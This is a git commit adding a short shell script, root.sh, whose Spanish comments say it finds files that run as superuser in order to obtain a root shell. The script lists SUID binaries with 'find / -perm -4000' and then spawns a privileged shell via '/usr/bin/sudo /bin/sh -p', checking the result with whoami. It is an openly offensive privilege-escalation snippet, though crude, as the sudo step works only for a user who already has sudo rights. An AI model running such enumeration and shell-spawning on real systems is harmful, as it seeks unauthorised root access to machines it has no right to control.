c411c161193f886f328de5c874387b4a9b745f1e
hackingyseguridad <antonio_taboada@hotmail.es>
2026-01-18 13:05:14 +0100

    Create root.sh

---
+++ root.sh
@@ -0,0 +1,15 @@
+
+
+# Busca ficheros en el sistema que se ejecuten como Super User
+# Vamos a usar esos ficheros para ejecutar una Shell como Root
+# (r) hackingyseguridad.com 2026
+# antonio_taboada
+
+echo " busca fichero que se ejecutan como root en el sistema:"
+find / -perm -4000 2>/dev/null
+
+# por ejemplo ejecutamos una shell con con sudo
+
+/usr/bin/sudo /bin/sh -p
+
+whoami
